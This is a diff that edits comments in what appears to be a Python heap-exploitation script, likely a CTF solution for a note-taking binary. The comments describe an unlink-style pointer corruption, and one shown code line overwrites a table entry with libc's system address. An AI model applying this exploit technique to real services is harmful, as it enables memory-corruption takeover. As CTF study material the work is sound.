@@ -201,7 +201,7 @@ if __name__ == "__main__":
 
     # delete_note(1) makes target points to itself (to be precise, -24 bytes)
     #
-    # since, note0->ptr points &note0->ptr-24, we need to add 3-qword prefixes.
+    # since, note0->ptr points &note0->ptr-24, we need to add 3-qword prefix.
     # entire payload size should be same as previous malloc(), or realloc() will come into play and break the entire exploit sequence apart.
     #
     # [COUNT 1] [OCCUPIED YES] [NOTE SIZE 8] [PTR to CHUNK]
@@ -210,7 +210,7 @@ if __name__ == "__main__":
 
     raw_input('after editing note_0->ptr to 0x602018...')
 
-    # we have overwritten note0->size to 8, to prevent realloc() coming into play. that's a good thing.
+    # we have overwritten note0->size to 8, to prevent realloc() coming into play. 
     # and no need to add 3-qword prefix because note0->ptr points the exact target position.
 
     edit_note(0, 8, p64(libc_base+libc.symbols['system']))       
